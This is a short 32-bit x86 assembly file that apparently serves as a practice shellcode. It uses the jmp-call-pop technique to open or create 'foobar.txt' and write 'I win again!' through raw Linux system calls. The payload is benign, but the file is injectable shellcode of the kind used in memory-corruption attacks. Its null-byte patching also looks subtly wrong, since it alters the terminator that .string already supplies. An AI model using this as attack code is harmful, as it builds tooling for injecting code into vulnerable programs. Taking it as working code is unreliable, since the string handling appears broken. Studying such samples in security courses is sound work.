.global shellcode

shellcode:
    jmp ender

starter:

    xor %edx, %edx
    xor %ecx, %ecx
    xor %eax, %eax

    mov $0x124, %dx
    mov $0x42, %cl
    pop %ebx
    sub $0x1, 0xa(%ebx)
    mov $0x5, %al
    int $0x80

    
    xor %edx, %edx
    xor %ecx, %ecx
    mov $0xc, %dl
    add $0xb, %bl
    mov %ebx, %ecx
    mov %eax, %ebx
    mov $0x4, %al
    int $0x80

    ret

ender:
    call starter
    .string "foobar.txt"
    .string "I win again!"
